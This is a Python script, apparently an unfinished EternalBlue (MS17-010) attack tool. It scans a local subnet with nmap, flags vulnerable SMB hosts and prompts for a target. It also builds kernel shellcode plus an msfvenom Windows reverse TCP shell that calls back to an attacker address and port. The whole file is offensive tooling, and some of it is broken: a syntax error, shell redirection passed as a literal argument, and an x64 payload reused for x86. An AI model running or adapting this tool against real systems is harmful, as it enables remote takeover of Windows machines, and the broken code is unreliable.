import pyfiglet as pf
import subprocess as sp
import netifaces as ni


def intro(): #split clear and figlet into function
	#subprocess
	sp.call(["clear"])

	#variabili
	result2 = pf.figlet_format("eternalB", font="larry3d")

	#output
	print(result2)
	print("Welcome on EternalB")


def scan1():
    #variabili
	s = "Nmap scan report for "
	ipList = list()

	#subprocess
	p = sp.Popen(["sudo","nmap","-sP","192.168.69.0/24"], stdout=sp.PIPE).stdout
	l = p.read().splitlines()

	#decode from byte to string
	l = [x.decode("utf-8") for x in l]

	#rimuovi primo e ultimo elemento
	del l[0]
	del l[-1]

	#ciclo stampa ip
	for i, x in enumerate(l):
		if s in x:
			l[i] = x.replace(s,'')
			#print(l[i])
			ipList.append(l[i])
	return ipList


def scan2(lst):
	#variabili
	vulnList = list()
	
	for ip in lst:
		if checkVuln(ip)
			vulnList.append((ip))
	print(vulnList)
	return vulnList


def checkVuln(ip):
	#subprocess
	p = sp.Popen(["sudo","nmap","-p", "445", "--script", "smb-vuln-ms17-010", ip], stdout=sp.PIPE).stdout
	t = p.read().splitlines()
	
	#decode from byte to string
	t = [x.decode("utf-8") for x in t]
	
	#ciclo check ip
	for i in t:
		if "VULNERABLE" in i:
			return True
	return False


def choseTarget(vulnList):
	for i in vulnList:
		print("[" + str(vulnList.index(i)) + "]" + " " + i)
	return vulnList[int(input("Choose the target: "))]
	

#def execVuln():
#	shellPrep()
#
#
#


def getIP():
	try:
		ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
	except:
		ip = ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr']
	return ip


def shellPrep():
	targetIp="LHOST=192.168.69.99" #da passare
	portx64="LPORT=1234"
	portx86="LPORT=1234"

	#print("Compiling x64 kernel shellcode...")
	sp.run(['nasm', '-f', 'bin', 'shellcode/eternalblue_kshellcode_x64.asm', '-o', 'shellcode/sc_x64_kernel.bin'])
	#print("Compiling x86 kernel shellcode...")
	sp.run(['nasm', '-f', 'bin', 'shellcode/eternalblue_kshellcode_x86.asm', '-o', 'shellcode/sc_x86_kernel.bin'])

	#print("Generating x64 cmd shell...")
	sp.run(['msfvenom', '-p', 'windows/x64/shell_reverse_tcp', '-f', 'raw', '-o', 'shellcode/sc_x64_msf.bin', 'EXITFUNC=thread', targetIp, portx64])
	#print("Generating x86 cmd shell...")
	sp.run(['msfvenom', '-p', 'windows/x64/shell_reverse_tcp', '-f', 'raw', '-o', 'shellcode/sc_x86_msf.bin', 'EXITFUNC=thread', targetIp, portx86])

	#print("Merging shellcode...")
	sp.run(['cat', 'shellcode/sc_x64_kernel.bin', 'shellcode/sc_x64_msf.bin', '>', 'shellcode/sc_x64.bin'])
	sp.run(['cat', 'shellcode/sc_x86_kernel.bin', 'shellcode/sc_x86_msf.bin', '>', 'shellcode/sc_x86.bin'])
	sp.run(['python3', 'shellcode/eternalblue_sc_merge.py', 'shellcode/sc_x86.bin', 'shellcode/sc_x64.bin', 'shellcode/sc_all.bin'])


#                                                                              #
# ---------------------------------------------------------------------------- #
#                                                                              #

if __name__ == "__main__":
	intro()
	print("fine intro")
	#ipList = scan1()
	#print("fine scan1")
	#print(iplist)
	#vulnList = scan2(iplist)
	#print(checkVuln("192.168.69.1"))
	#execVuln(ipVuln)
	
